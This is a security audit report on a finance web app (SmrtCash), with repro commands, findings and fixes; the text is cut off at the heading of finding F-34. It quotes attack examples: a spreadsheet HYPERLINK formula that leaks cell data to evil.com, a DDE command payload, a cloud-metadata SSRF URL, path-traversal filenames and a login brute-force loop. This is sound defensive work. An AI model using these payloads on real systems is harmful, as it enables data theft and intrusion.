# SmrtCash — Security & E2E Audit — 2026-05-25

**Target**: smrtcash-test.builditsmrt.com (mirror of prod)
**Version under test**: 0.18.12 (commit 7f98862)
**Test scope**: Stripe E2E automation, auth/session, cross-tenant IDOR, injection/fuzz, webhook integrity, API key + share-link access controls, **plus phase-2 deep dives**: envelope encryption empirical verification, AI assistant scoping, Plaid token storage, entitlement bypass, email-change ATO, OIDC flow, file upload depth, CSV/OFX import, SSRF, npm audit, race conditions, log scrubbing, TLS/email auth, git history, frontend bundle, container hardening, audit log integrity, account deletion cascade, session lifecycle, CSRF/SameSite, compliance pages, backup security
**Stripe**: Test mode keys configured via .env (loaded by dotenv at boot); live checkout deliberately not exercised per scoping decision
**Test users**: `sectest-userA-1779721134@example.invalid`, `sectest-userB-1779721134@example.invalid` (cleanup commands at bottom)

---

## Executive summary

| Severity | Count | Theme |
|----------|-------|-------|
| **P0** | 1 | Backup snapshot exposes SESSION_SECRET + ATTACHMENT_ENCRYPTION_KEY in plaintext |
| **P1** | 10 | Brute-force, reset-timing, reset-token siblings, security headers, **OIDC email-link ATO**, **DMARC duplicate**, **session-membership desync**, **legal pages missing**, **tenant delete broken**, **no user self-deletion** |
| **P2** | 11 | Session rotation, login timing, password policy, signup/reset rate limits, error-message info leak, no KEK rotation function, file content-type spoof, SSRF on OFX URL, CSV formula injection, OIDC id_token signature not verified, audit log mutability at SQL layer |
| **P3 / Info** | 6 | Session-IP-binding (by-design), idle timeout default off, API-key scope granularity, no-user-self-delete UX, concurrent-signup 500s, container rootfs not read-only |

**Recommendation**: One P0 + ten P1 findings. The P0 (backup snapshot leaks the encryption KEK) is the single most important fix — it defeats the per-tenant envelope encryption moat. Without it, every other encryption finding is academic. Land all P0+P1 before flipping Stripe to live mode. The combination of (F-01 no login rate limit) + (F-07 weak password policy) + (F-02 reset timing enumeration) is still a credential-stuffing kit. The OIDC ATO is latent — only exploitable once OIDC providers are enabled, but the code path is live.

**What's solid**: cross-tenant isolation, IDOR protection, Stripe webhook signature handling, cookie hardening, parameterized SQL throughout, API key read-only enforcement, super-admin gating. The deep stuff that's expensive to retrofit is already correct.

---

## Findings

### F-01 — No brute-force protection on login (P1)

**Repro**: 50 sequential POSTs to `/api/auth/login` with wrong passwords for the same email, then one POST with the correct password.

```
$ for i in $(seq 1 50); do curl -sS -o /dev/null -X POST .../api/auth/login \
    -d '{"email":"sectest-...","password":"wrong'$i'"}' -w "%{http_code}\n"; done | sort | uniq -c
  50 401
```
Duration: 14 seconds across 50 attempts = ~3.6 req/sec sustained. No 429, no Retry-After, no `account_locked` semaphore. Account #51 with the **correct** password returned 200 immediately.

**Impact**: With an 8-char minimum password (F-07) and no complexity requirement, an attacker who scrapes one email from the timing-based enumeration (F-02) can run unbounded credential stuffing against the login endpoint. Cloudflare doesn't see anything wrong — these are valid, well-formed login requests.

**Fix options** (pick one or layer):
1. Cloudflare WAF rule: 10 requests/minute per IP to `/api/auth/login`. Cheapest fix, no code change.
2. Application-level: count failed attempts in a `login_attempts` table keyed by `(email, ip)` with a 15-minute window. Return 429 after 5 failures.
3. Hybrid: WAF for IP-based, app-level for email-based (defeats distributed attackers).

The relevant code is `server/src/routes/auth.ts:606` (the login handler) — there is no rate-limit hook today.

---

### F-02 — Password-reset endpoint user enumeration via timing (P1)

**Repro**: 10 POSTs each to `/api/auth/password-reset-request` for an existing vs non-existent email.

```
existing : 1.152 1.189 1.159 1.175 1.183 1.190 1.181 1.206 1.175 1.240   (avg ~1.18s)
non-exist: 0.107 0.122 0.112 0.122 0.115 0.113 0.128 0.105 0.138 0.125   (avg ~0.12s)
```
10x signal. Response bodies are identical (`{"status":"reset_sent"}`, HTTP 202) — but the wall-clock difference is large enough to enumerate the user table from a script.

**Impact**: An attacker scraping a leaked email list can determine which addresses correspond to real SmrtCash accounts in ~0.2 seconds per check. Combined with F-01 (no login rate limit) this enables targeted credential stuffing.

**Root cause**: the endpoint does meaningful work (mint token, write DB row, hit Maileroo via SMTP) only when the user exists. The "no-op" branch returns instantly.

**Fix**:
- **Preferred**: enqueue the reset-email work on a background job and return 202 immediately, regardless of whether the user exists. Symmetric latency.
- **Alternative**: enforce a floor — `setTimeout(() => reply.send(...), Math.max(0, 1200 - elapsed))`. Cheaper, less elegant.

File: `server/src/routes/auth.ts:477` (the password-reset-request handler).

---

### F-03 — Password reset: sibling outstanding tokens not invalidated (P1)

**Repro**: Trigger 10 reset-request POSTs for the same email (gets 10 unconsumed tokens). Consume token #1 successfully via `/api/auth/password-reset-confirm`. Then consume token #2.

```
=== T29: re-use the same reset token ===
{"error":"This reset link has already been used"}  HTTP=400
=== T30: re-use a DIFFERENT unconsumed reset token (for the same user) ===
{"reset":true}                                      HTTP=200
```

The other unconsumed tokens remain valid until they expire on their own.

**Impact**: If an attacker is able to intercept *one* reset email (timing-correlated to user activity, SS7 attack on SMS, MITM on a legacy email account, etc.) they can use it to reset, and then the legitimate user resetting themselves won't kick them out — the attacker's *other* in-flight tokens still work. The window stays open until every outstanding token expires.

**Fix**: when `password-reset-confirm` succeeds, also do `DELETE FROM password_resets WHERE user_id = $1 AND consumed_at IS NULL`. Two-line change.

File: `server/src/routes/auth.ts:538` (the password-reset-confirm handler).

---

### F-04 — Missing security response headers (P1)

**Repro**:
```
$ curl -sI https://smrtcash-test.builditsmrt.com/ | grep -iE "content-security|x-frame|x-content|referrer|permissions"
(empty)
```

HSTS is set by Cloudflare (`strict-transport-security: max-age=63072000; preload`), but everything else is absent:

| Header | Present | Should be |
|--------|---------|-----------|
| Content-Security-Policy | ❌ | `default-src 'self'; frame-ancestors 'none'; ...` |
| X-Frame-Options | ❌ | `DENY` |
| X-Content-Type-Options | ❌ | `nosniff` |
| Referrer-Policy | ❌ | `strict-origin-when-cross-origin` |
| Permissions-Policy | ❌ | minimal allow list |

**Impact**: 
- The financial dashboard can be iframed by any site → clickjacking risk on destructive actions (delete account, change password).
- No CSP means any reflected/stored XSS escapes (none found in this audit, but defense-in-depth matters) gain full inline-script execution.
- MIME sniffing can turn an uploaded attachment into an executable page if a content-type is fudged.

**Fix**: either Cloudflare Transform Rules (UI-managed, no deploy) or Fastify's `@fastify/helmet` plugin. Helmet's defaults are reasonable and would land all five headers in ~5 lines of code in `server/src/app.ts`.

---

### F-05 — No session rotation on login (P2)

**Repro**: 
1. Verify-email creates session #1 (cookie-A). 
2. Log in with the same credentials → session #2 (cookie-B). 
3. Hit `/api/auth/me` with cookie-A → still 200.

```sql
-- after step 2:
SELECT count(*) FROM sessions WHERE user_id='...' AND expires_at>now();
-- => 2
```

**Impact**: classic session fixation. If an attacker can plant a cookie before the victim logs in — same-site XSS, hostile browser extension, shared device — the attacker's cookie keeps working *after* the victim authenticates. SameSite=Strict prevents the cross-site attach vector, so the primary risk window is shared-device / extension scenarios, not the classic email-link version. Still worth fixing.

**Fix**: in `/api/auth/login` after credentials succeed, before issuing the new session, call `deleteAllSessionsForUser(userId)` *or* at minimum the session bound to the current cookie. The `deleteAllSessionsForUser` helper already exists (`auth/sessions.ts:89`) and is what password-reset uses. Most apps split the difference and only invalidate the inbound session.

File: `server/src/routes/auth.ts:606`.

---

### F-06 — Login response-time leaks user existence (P2)

**Repro**: 10 wrong-password attempts each, existing vs non-existent email.

```
existing user wrong pass : avg ~0.227s
non-existent user        : avg ~0.196s   (~30ms gap)
```

The gap is consistent with `argon2.verify` (memoryCost 19MiB, timeCost 2) running only when the user exists. Smaller signal than F-02 but still measurable across a few samples per address.

**Fix**: in the login handler, when the user lookup misses, do a dummy `argon2.verify(KNOWN_DUMMY_HASH, password)` so total CPU work is identical. Standard pattern; ~3 lines.

File: `server/src/routes/auth.ts:606`. The hash to use can be a constant `argon2.hash('throwaway')` evaluated once at module load.

---

### F-07 — Weak password policy (P2)

**Repro**: signup with `password: "aaaaaaaa"` succeeds. Source confirms the policy is "≥ 8 chars, ≤ 1024 chars" with no other constraints (`server/src/auth/passwords.ts:18`).

No complexity check, no common-password blocklist, no breach-list check (HIBP k-anonymity API is the standard).

**Impact**: combined with F-01, this is what gives credential stuffing its teeth. A user signing up with `password123` is happily accepted.

**Fix recommendations**:
- Raise minimum to 12 characters.
- Or keep 8 but add an HIBP check — block reuse of breached passwords.
- Optionally, require one of: mixed case OR digit OR symbol. (NIST 800-63B explicitly recommends *against* arbitrary complexity rules in favor of length + breach checks.)

File: `server/src/auth/passwords.ts:18`. ~10-line change.

---

### F-08 — No rate limit on password-reset-request → email-bomb (P2)

**Repro**: in the timing test (F-02), 10 sequential POSTs to `/api/auth/password-reset-request` for the same email minted 10 fresh tokens and (per the code path) sent 10 emails via Maileroo. No 429, no in-flight dedup.

**Impact**: anyone who knows a user's email can flood their inbox with reset emails. Annoyance, plus risk that the legitimate reset email gets buried/filtered, plus burns Maileroo quota.

**Fix**: either Cloudflare WAF (1 request per email per minute is reasonable) or app-level — refuse to mint a fresh token if an unconsumed, unexpired one exists for the user within the last 60 seconds. ~5-line change.

The same pattern probably applies to `/api/auth/signup` (untested — no SMTP send observed but same architecture).

---

### F-09 — Error message leaks JSON parser state on malformed body (P2)

**Repro**: POST `/api/auth/login` with `{"email":"test@x.com"; DROP TABLE users; --` (intentionally malformed JSON).

```
HTTP 500
{"error":"Expected ',' or '}' after property value in JSON at position 21 (line 1 column 22)"}
```

The Fastify-default error handler returns the raw `err.message` from the JSON parser, including character offsets.

**Impact**: low. It's not a stack trace, and the user-controllable input is the same input the attacker just sent. But returning a 500 with parser internals on a 400-shaped failure is sloppy and can give automated scanners a fingerprint.

**Fix**: in `app.ts:250` (the error handler), if the error originates from `FastifyError` with code `'FST_ERR_CTP_INVALID_MEDIA_TYPE'` / `'FST_ERR_VALIDATION'` / a SyntaxError from JSON.parse, return 400 with a generic message. Map all parser-class errors to 400, all unexpected errors to 500 with `{ error: 'Internal server error' }` and the detail logged server-side.

---

### F-10 — Sessions not bound to IP / User-Agent (Info, by design)

A copied session cookie works from any source IP, any User-Agent. Confirmed: `curl -H "Cookie: ..." -H "User-Agent: EvilBrowser/1.0"` from a different network → 200.

**Design note**: this is intentional and matches the rest of the SaaS world. IP binding breaks legitimate users every time they switch networks (Wi-Fi ↔ cellular, VPN on/off); UA binding breaks them every time a browser auto-updates. SameSite=Strict + HttpOnly + Secure + signed cookies are the modern mitigations and they're already in place.

**The user's original question** ("making sure a user cannot just use a link or copy cookies and have access to an account") deserves a direct answer: **a copied session cookie WILL grant access to that account until logout, password reset, or the 7-day expiry**. The cookie is the credential. Mitigations that exist:
- `HttpOnly` blocks `document.cookie` from JavaScript → can't be stolen via XSS to JS.
- `Secure` blocks transit over plain HTTP → can't be stolen by network sniffer.
- `SameSite=Strict` blocks attached on any cross-site navigation → can't be stolen by a malicious link.
- Signed cookie blocks forging.
- Server-side session in DB means revocation is instant and complete.

What's left: physical access to a device, malware on a device, a browser extension. Those are unsolvable at the cookie layer.

**If you want to harden further** (optional):
- "Active sessions" page so users can see and revoke other sessions.
- Email notification on login from a new IP.
- A configurable absolute idle timeout enforced *server-side* (today only the client-side `useIdleTimeout` hook applies, gated by `WEB_INACTIVITY_TIMEOUT_MINUTES`).

---

### F-11 — Idle logout is client-side only (Info)

Server only enforces the 7-day absolute expiry. The `useIdleTimeout` hook (`web/src/hooks/useIdleTimeout.ts`) is the entire mechanism, and it defaults to 0 (disabled). A user who closes the browser without logging out leaves a valid session live for up to 7 days.

**Fix if desired**: store `last_activity_at` on the session, update on each authenticated request, and reject sessions whose last activity is older than a configurable window.

---

### F-12 — API key scoping is tenant-wide read (Info)

API keys grant read access to all of the tenant's data. There's no per-resource scope (e.g., "read transactions only", "read accounts only") and no per-time-window scope (no expiry). This matches the 0.18.4 design ("public read-only API") but is worth noting because it means a leaked key exposes everything until manually revoked.

**Fix if desired**: add `expires_at` column (nullable) and a UI for setting per-key expiries. Granular per-resource scopes are a bigger lift.

---

## What's working well

These were tested and confirmed correct — calling out so future audits don't re-litigate:

- **Cookie hardening**: `smrtcash_session` has `HttpOnly`, `Secure`, `SameSite=Strict`, `path=/`, signed with HMAC via `@fastify/cookie`. 7-day absolute expiry. Tampered/unsigned/random cookies all → 401.
- **Logout invalidates server-side**: cookie clear + `deleteSession(id)` in `auth/sessions.ts:79`.
- **Password reset destroys all user sessions**: confirmed pre-reset count = 2 active, post-reset count = 0.
- **Verification token replay blocked**: consumed_at check at `auth.ts:383`.
- **Signup idempotency / no enumeration**: same 202 response whether the email exists or not.
- **All SQL is parameterized**: boolean-based, error-based, and time-based (pg_sleep) injection probes against login, account create, transactions search all returned identical timing and zero leakage.
- **Cross-tenant IDOR sweep**: accounts, budgets, goals, transactions, attachments — every endpoint returns 404 when the resource exists in another tenant. Mutations are gated by `WHERE id = $1 AND tenant_id = $session_tenant` SQL.
- **Tenant_id forgery in POST body**: ignored. Server always uses session's `tenantId`.
- **X-Tenant-Id header forgery**: ignored. Header is not consumed.
- **Tenant switch to non-member tenant**: 403 "Not a member of that tenant" at `/api/tenants/switch`.
- **Super-admin endpoints**: 403 "Super admin only" for regular users; 401 with no auth.
- **API keys**:
  - Mint requires session.
  - Read-only enforced at middleware layer (`app.ts:240-248`).
  - POST/PATCH/DELETE → 403 "API keys are read-only".
  - Cannot mint another key with itself (self-replication blocked).
  - Revocation is instant — `DELETE /api/me/api-keys/:id` → subsequent bearer request 401.
  - Invalid token formats (`smrt_`, `smrt`, `fakebearer`, suffix-padded valid token) all → 401.
  - Tenant-scoped at mint time; cannot enumerate cross-tenant data.
- **Stripe webhook**:
  - Missing signature → 400.
  - Forged signature (`v1=deadbeef...`) → 400 with Stripe SDK rejection.
  - Malformed signature header → 400.
  - GET method → 404.
  - Raw-body parser correctly wired for HMAC verification.
- **Path traversal in attachments**: URL-encoded `..%2F..%2Fetc%2Fpasswd` → 400; bare `../../etc/passwd` falls through to the SPA static handler (returns index.html — no file leak).
- **Body size limit**: 5MB JSON body → 413 "Request body is too large" (Fastify default ~1MB).
- **Prototype pollution**: `__proto__` and `constructor.prototype` in JSON body did not propagate to subsequent responses.
- **CORS**: reflective with credentials, but SameSite=Strict on the session cookie prevents the usual CSRF vector. Acceptable in current shape.
- **Public path list**: `/api/health`, `/api/auth/{status,setup,login,logout,signup,verify-email,providers,password-reset-{request,confirm}}`, `/api/billing/webhook`, `/api/auth/oidc/*`, `/api/invitations/*`. Audited — no over-broad exposure.
- **Invitation lookup**: `/api/invitations/{uuid}` → 404 "Invitation not found" regardless of whether the token exists; doesn't leak existence.

---

---

## Phase 2 findings (deep dives — added 2026-05-25 PM)

### F-13 — Backup snapshot leaks SESSION_SECRET + KEK + Stripe creds in plaintext (P0)

**Repro**:
```
ssh srv928192 docker exec smrtcash-app cat /data/backups/2026-05-25_15-16-05/env.snapshot.json
```
The file contains in **cleartext**:
- `SESSION_SECRET` — used to sign session cookies. Leak = forge any session.
- `ATTACHMENT_ENCRYPTION_KEY` — the KEK that wraps every tenant's DEK and directly encrypts Plaid access tokens + OFX-DC credentials. Leak = decrypt every encrypted attachment and every bank token of every tenant.
- `STRIPE_SECRET_KEY` (sk_test_…) and `STRIPE_WEBHOOK_SECRET` (whsec_…).

The backup runner (`scripts/backup.mjs`) drops a fresh `env.snapshot.json` into `/data/backups/<ts>/` every run. Files are 644 — readable by anyone in the container's `node` group, and on the host they're under the docker volume mount.

**Impact**: anyone with backup-file access — a leaked S3 backup, a stolen laptop with a sync, an attacker who pops one tenant and pivots — gets:
1. Sign-any-user-as-them (forge cookies).
2. Decrypt every tenant's attachments + Plaid tokens (defeats the whole envelope-encryption moat).
3. Full Stripe account access (test mode today; will be live in 0.22.x).

This is the single most important finding in the audit. The per-tenant DEK design is well-implemented (verified empirically in F-14), but if the KEK that wraps the DEKs is in every backup, the architecture is moot.

**Fix**:
1. Remove SESSION_SECRET, ATTACHMENT_ENCRYPTION_KEY, STRIPE_SECRET_KEY, STRIPE_WEBHOOK_SECRET, SMTP_PASS, ANTHROPIC_API_KEY, EIA_API_KEY, and any other secret-class key from the `KNOWN_SETTINGS` capture list used by env.snapshot.json. The snapshot should hold only NON-SECRET operator config (PUBLIC_BASE_URL, SUPPORT_URL, PUBLIC_SIGNUP_ENABLED, STRIPE_AUTOMATIC_TAX, AI_PROVIDER, ANTHROPIC_MODEL, OLLAMA_BASE_URL, OLLAMA_MODEL).
2. Delete every existing `env.snapshot.json` from the test server (and any prod-bound backups in the future).
3. **Rotate the test-server SESSION_SECRET and ATTACHMENT_ENCRYPTION_KEY now** — they were visible in this audit transcript. After rotating the KEK, run the rewrap-all-DEKs procedure or accept that existing attachments are unrecoverable (test server only; OK to abandon).
4. Add a launch-gate check: a CI test that ensures the backup-snapshot output contains zero of a list of known secret keys.

File: `scripts/backup.mjs` (likely around the env-capture step); also the `KNOWN_SETTINGS` definition in `server/src/domain/settings.ts`.

---

### F-14 — Per-tenant envelope encryption: verified working (no finding)

Logged as a confirmation, not a gap. Uploaded a PDF as user A with a unique marker string, then:
- ✅ On-disk file is opaque ciphertext (no MARKER substring found on disk)
- ✅ Size math: 85B plaintext + 12B IV + 16B GCM tag = 113B on disk
- ✅ Per-tenant DEK row in `tenant_encryption_keys` (wrapped_dek = 60B = 32B DEK + 12B IV + 16B GCM tag)
- ✅ Download API decrypts back to original plaintext
- ✅ AES-256-GCM with random IV per encryption, AAD via GCM tag

Code review of `attachments/tenant-keys.ts`: well-structured. Rotation function `rotateTenantKey()` is transactional, includes `safePath()` traversal guard.

⚠️ Caveat: this all assumes the KEK isn't leaked. See F-13.

---

### F-15 — No KEK rotation function (P2)

The codebase has `rotateTenantKey()` which rotates a tenant's DEK (re-encrypts everything under the new DEK, rewraps with the **current** KEK). There is **no function that rotates the KEK itself**.

To rotate the KEK an operator would have to:
1. Read every `tenant_encryption_keys.wrapped_dek` row,
2. Unwrap with the old KEK,
3. Rewrap with the new KEK,
4. Update the rows.

Without this function, swapping `ATTACHMENT_ENCRYPTION_KEY` to a new value bricks every existing attachment (DEKs can no longer be unwrapped). The vision doc (`docs/ROADMAP.md`) mentions a "one-click rotation flow at `/system/tenants/:id/rotate-encryption-key`" — that's DEK rotation, not KEK rotation. Naming is misleading.

**Fix**: add `rotateKek(oldKek, newKek)` that does the rewrap-all-DEKs loop in a transaction. Wire to a super-admin endpoint. Document the runbook: "set NEW_ATTACHMENT_ENCRYPTION_KEY → call rotateKek → swap env var → restart".

File: add to `server/src/attachments/tenant-keys.ts`.

---

### F-16 — AI Assistant tool surface: structurally bulletproof (no finding)

All 17 tools in `server/src/domain/assistant/tools.ts` use `ctx.tenantId` (closure-captured from the authenticated session) in their SQL. No tool accepts `tenantId` as an input parameter, so the model — even under a successful prompt injection — cannot supply a different tenant. Confirmed by grep + line-by-line review.

The runtime (`server/src/domain/assistant/runtime.ts`) feeds the model only the user's chat messages + a static system prompt; the tenant ID is never in the conversation. Message history is sanitized (role + content only), capped at 40 turns, 4096 tokens/response, 8 tool-use iterations max. Write tools each call `recordAudit()`.

Worst case from prompt injection: model wastes the user's own quota and produces confused output within the user's own tenant. No cross-tenant exfil possible.

(Couldn't empirically test prompt injection because A is on free tier — 402 on `/api/assistant/chat`. Structural review is sufficient because the SQL pattern is uniform.)

---

### F-17 — Plaid token storage: encrypted-at-rest, tenant-scoped (no finding, with note)

- `plaid_items.access_token_encrypted` is `bytea` containing `[12-byte IV][ciphertext][16-byte GCM tag]`.
- Uses `domain/crypto.ts` (AES-256-GCM) with the KEK directly (no per-tenant DEK wrap — this is a deliberate choice for short DB-resident secrets).
- Every Plaid route calls `requireTenant()` and every SQL has `WHERE tenant_id = $`.

⚠️ Note: shares the KEK with attachments. F-13 applies — KEK leak compromises Plaid tokens too.

---

### F-18 — Entitlement bypass: gates hold (no finding)

Direct API hits from a free-tier session against paid-only endpoints all returned 402 "No active subscription on this tenant":
- `/api/assistant/chat` → 402
- `/api/plaid/link-token` → 402
- `/api/anomalies` → 402
- `/api/split-participants` (Family-only) → 402

Header/body forgery to spoof entitlement does not propagate — entitlement is read fresh from the DB per request via `requireFeature(tenantId, FEATURE)`.

---

### F-19 — Email-change ATO: not exploitable (no finding)

There is **no user-facing email-change endpoint at all**. `PATCH /api/auth/me` accepts only `name` and `timezone` — an `email` key in the body is silently ignored. Verified empirically.

This is the most secure stance possible. Minor UX note: users would need operator intervention to change their email — worth a product-backlog ticket.

---

### F-20 — OIDC: email-based identity auto-linking → account takeover (P1)

`server/src/auth/identities.ts:59-89` — when an OIDC callback returns an identity for a `providerUserId` not yet in `user_identities`, the resolver looks up users by `LOWER(email) = LOWER($claim_email)` and **auto-links the new OIDC identity to that user with no out-of-band confirmation and no `email_verified` claim check**.

Attack scenario: an attacker who can get any enabled OIDC provider to issue a token claiming `email: victim@example.com` is instantly logged in as the victim — no password, no 2FA, no email loop.

Routes to this code path:
- A misconfigured IdP that lets users set arbitrary unverified email
- A second OIDC provider added by a super-admin (Auth0, Okta dev tenants, self-hosted)
- An IdP that allows email change without re-verification

**Compounding**: `oidc.ts:172-173` deliberately skips id_token signature verification ("the token came over a direct TLS POST"). An attacker controlling TLS interception or with a malicious-yet-valid cert could forge tokens entirely.

OIDC is currently **disabled** on the test server (only `local` provider listed) — finding is latent.

**Fix** (any of these would mitigate; ideally all three):
1. Refuse to auto-link unless the id_token has `email_verified: true`.
2. On first link, require an email-loop confirmation to the local user's address ("an OIDC provider X is claiming this email — confirm?").
3. Verify id_token signature against the provider's JWKS endpoint.

File: `server/src/auth/identities.ts:59`, `server/src/auth/providers/oidc.ts:170-188`.

---

### F-21 — File upload accepts content/MIME mismatch → XSS-via-attachment (P2)

The attachments endpoint allowlists 4 MIME types (`jpeg/png/webp/pdf`) but only checks the **claimed** Content-Type, not the file's magic bytes:

- Uploading an SVG file with `Content-Type: application/pdf` succeeds — file is stored with `mime_type=application/pdf` but content is the SVG.
- Uploading HTML with `Content-Type: application/pdf` succeeds.
- Filename traversal (`../../../etc/evil.pdf`) is correctly stripped → filename: `evil.pdf` ✓
- Shell metacharacters in filename sanitized (`$(id).pdf` → `_id_.pdf`) ✓
- 26MB upload → 413 (25MB limit holds) ✓

Combined with F-04 (no `X-Content-Type-Options: nosniff`) and the preview endpoint serving `Content-Disposition: inline`, a browser may sniff the actual SVG content and execute embedded `<script>` in the SmrtCash origin. The download endpoint uses `attachment` disposition (good), but `/api/attachments/:id/preview` uses `inline`.

**Fix**:
1. Validate the uploaded file's magic bytes match the claimed Content-Type (npm `file-type` package, or hand-rolled match for JPEG `FF D8 FF`, PNG `89 50 4E 47`, WebP `RIFF…WEBP`, PDF `25 50 44 46`).
2. Add `X-Content-Type-Options: nosniff` to attachment responses (or globally via Helmet — see F-04).
3. Consider serving attachments from a separate cookieless subdomain so even successful XSS can't read session cookies.

File: `server/src/routes/attachments.ts:91` (upload handler), `:264` and `:291` (download + preview handlers).

---

### F-22 — CSV export is formula-injectable (P2)

`csvCell()` in `server/src/routes/transactions.ts:35` and `server/src/routes/tax-year.ts:144` quotes and escapes embedded `"` but does **not** prefix `=`, `+`, `-`, `@`, `\t`, or `\r` with a single-quote / tab / apostrophe.

Attack: a household member's malicious transaction description (e.g., `=HYPERLINK("http://evil.com/?leak="&A1&B1,"Click")` or `=cmd|'/c calc'!A1`) becomes a live Excel formula when the household admin exports for taxes.

**Fix**: in `csvCell()`, if the value starts with one of `= + - @ \t \r`, prefix with a single quote `'` (Excel's standard "treat as literal text" prefix). Three-line change.

---

### F-23 — OFX Direct Connect URL: no SSRF guardrails (P2)

`server/src/routes/ofx-dc.ts:425` validates only `/^https?:\/\//.test(ofxUrl)`. No block on:
- `http://127.0.0.1:5432/` (Postgres)
- `http://169.254.169.254/latest/meta-data/` (AWS IMDS — `iam/security-credentials/<role>` returns temp creds if running on EC2)
- `http://192.168.x.x`, `10.x.x.x`, `172.16-31.x.x` (private)
- DNS rebinding (resolver returns 8.8.8.8 on validation, 127.0.0.1 on fetch)

Exploit requires a paying customer with the BANK_SYNC feature (Plus/Family tier). Once configured, the server initiates an HTTP POST to the URL with OFX credentials in body.

Same SSRF surface on `OLLAMA_BASE_URL` (super-admin only — lower urgency).

**Fix**: in `validateUrlSetting()` and the OFX DC validator, resolve the hostname to IPs at validation time and refuse to save if any resolved IP is in:
- 127.0.0.0/8, ::1, fe80::/10
- 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- 169.254.0.0/16
- fc00::/7

Also resolve+check **at fetch time** to defeat DNS rebinding.

File: `server/src/routes/settings.ts:46` (validateUrlSetting), `server/src/routes/ofx-dc.ts:425`.

---

### F-24 — npm audit: clean (no finding)

`npm audit --prefix server` and `npm audit --prefix web` both returned zero vulnerabilities at every severity. argon2, fastify, pg, stripe, @anthropic-ai/sdk are all current.

---

### F-25 — Concurrent signup race: uncaught 500s (P3)

5 parallel signup requests for the same email returned 2 × 500, 3 × 202. The 500s come from a duplicate-key violation on the `users.email` UNIQUE constraint — the per-request `EXISTS` check (`auth.ts:298-322`) is not transactional with the INSERT, so two simultaneous requests can both pass the check and one fails to commit.

Practical impact:
- DB integrity preserved (1 user, 1 row).
- Two callers see a 500 (info leak: signals concurrent-request handling weakness).
- Three callers see normal 202.

**Fix**: wrap the existence check + INSERT in `withTransaction` with `ON CONFLICT (email) DO NOTHING` semantics, or catch the duplicate-key error and convert to a 202 (idempotent response).

File: `server/src/routes/auth.ts:268`.

---

### F-26 — Log scrubbing: clean (no finding)

`docker logs --tail 1000 smrtcash-app` was scanned for:
- `password`, `Bearer …`, session cookie payloads, `smrt_<token>` API keys, `whsec_…`, `sk_test_/sk_live_…`, Plaid access tokens, `verify_url`, `reset_url`

Zero matches. The mailer's "verify URL not sent" warning (auth.ts:144) DOES include `verifyUrl` in the log entry — but only when SMTP send fails. Since SMTP is configured (Maileroo) on the test server, this path doesn't trigger. Worth keeping an eye on: if SMTP ever flaps, verify links go to logs. Acceptable for now since logs are operator-only.

---

### F-27 — TLS / HSTS / cert chain: clean (no finding)

- TLS 1.3 only
- Cert: Google Trust Services, valid chain
- HSTS: `max-age=63072000; preload` (2-year, preload-eligible)
- Cipher: TLS_AES_256_GCM_SHA384

---

### F-28 — DMARC duplicate record on builditsmrt.com (P1)

DNS lookup of `_dmarc.builditsmrt.com` returns **two** TXT records:
```
v=DMARC1; p=none;
v=DMARC1; p=reject;
```

Per RFC 7489 §6.6.3: if multiple DMARC records are returned, the Mail Receiver MUST NOT apply DMARC policy. So DMARC is **effectively disabled** — your verify/reset/dunning emails are spoofable by any sender, and "noreply@builditsmrt.com" From-line is unprotected.

Also: neither record has a `rua=mailto:…` reporting address, so even if it worked, you'd never see failure reports.

SPF on `builditsmrt.com` is in place: `v=spf1 include:_spf.maileroo.com ~all` ✓ (soft-fail; consider tightening to `-all` once you've confirmed Maileroo is the only sender). DKIM under common selectors (`maileroo`, `mr1`, `mr2`, `selector1`, etc.) returned empty — Maileroo's actual selector needs to be confirmed against their dashboard and the matching TXT record added.

**Fix**:
1. Delete the `v=DMARC1; p=none;` TXT record at `_dmarc.builditsmrt.com`. Keep only `v=DMARC1; p=reject; rua=mailto:dmarc-reports@builditsmrt.com; pct=100`.
2. Confirm Maileroo's actual DKIM selector and add the corresponding TXT record.
3. Send a test email through Maileroo and check the received headers for `dkim=pass`, `spf=pass`, `dmarc=pass`.

---

### F-29 — Git history secret scan: clean (no finding)

`git log --all -p | grep -E "(sk_live_|whsec_|AKIA|PRIVATE KEY)"` returned only docs/placeholders (`docs/STRIPE_SETUP.md` has `sk_test_…` examples) and test-fixture passwords (`correct-horse-battery-staple` constants). No real committed secrets.

---

### F-30 — Frontend bundle: clean (no finding)

- No source maps in production (`assets/index-CTbB6Hjm.js.map` → 404)
- No hardcoded API/Stripe/AWS/Google keys (grep across the 992KB bundle)
- No leaked `VITE_*` env values
- "localhost" reference is a URL-construction fallback for SSR-like guard — not a leak

---

### F-31 — Container hardening: mostly good, rootfs not readonly (P3)

- Running as uid=1000(node) — NOT root ✓
- Dockerfile has explicit `USER node` (line 46) ✓
- Container is NOT `privileged` ✓
- No added Linux capabilities ✓
- ⚠️ `ReadonlyRootfs: false` — would be defense-in-depth to set rootfs read-only with a tmpfs for `/tmp` and an explicit RW volume for `/data`.
- ⚠️ No `security_opt: ["no-new-privileges:true"]`, no AppArmor/seccomp profile specified.

P3. Lower priority than the listed P0/P1 items.

---

### F-32 — Audit log integrity: no app-layer mutation path; no DB-layer guard (P2)

Reviewed `server/src/routes/` — every `audit_log` reference is an INSERT (via `recordAudit()`). No UPDATE or DELETE statement against `audit_log` exists anywhere in the codebase. A tenant_admin has no API path to tamper.

⚠️ However: there's no DB-layer guard (no trigger, no role-level permission). If app-level SQL injection ever opens up (none found in this audit), audit rows could be mutated. Pure defense-in-depth.

**Fix** (optional): create a Postgres trigger `BEFORE UPDATE OR DELETE ON audit_log` that raises an exception. Or a per-table role grant that only allows INSERT to the app role. Either way: even compromised app-level SQL can't rewrite history.

---

### F-33 — No compliance pages (P1)

`/privacy`, `/terms`, `/cookies`, `/legal`, `/privacy-policy`, `/terms-of-service`, `/about` — every probe returns the SPA index.html (same content/size as `/`). There are no `web/src/pages/Privacy*` or `Terms*` components in the codebase. No cookie-consent banner exists.

For a SaaS that:
- Stores financial data (potential PII + sensitive personal info)
- Charges customers via Stripe (CCPA/state-level requirements)
- Sends marketing or transactional emails (CAN-SPAM)
- Will likely have EU/EEA traffic (GDPR)

…this is a launch-blocker for charging real customers.

**Fix**: at minimum ship a Privacy Policy and Terms of Service before flipping Stripe to live. Footer links from public pages (login/signup) to both. A cookie notice is nice but the SameSite=Strict-only "strictly necessary" cookies arguably don't require explicit GDPR consent. Lawyer-review recommended either way.

---

### F-34 — Tenant deletion FK constraints not CASCADE (P1)

